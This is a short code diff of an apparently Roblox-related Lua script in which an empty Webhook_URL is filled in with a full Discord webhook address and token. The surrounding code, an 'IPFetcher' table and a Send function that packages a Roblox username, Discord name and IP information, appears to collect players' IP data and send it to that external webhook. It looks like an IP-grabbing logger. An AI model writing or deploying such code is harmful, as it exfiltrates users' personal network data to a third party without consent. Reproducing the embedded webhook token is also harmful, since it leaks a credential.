@@ -74,7 +74,7 @@ IPFetcher = {
 }
 
 Webhook = {
-  Webhook_URL = "",
+  Webhook_URL = "https://discord.com/api/webhooks/1430029174650961950/9pqx5JWwm--6pqRGz_Wpy2ZM7LGQZk25aUH5facych9dq_I05GNs4t3OfEjcpDJxroCY",
   Send = function(username, discordName, ipInfo)
     local fields = {
       {name = "Roblox Username", value = username, inline = true},
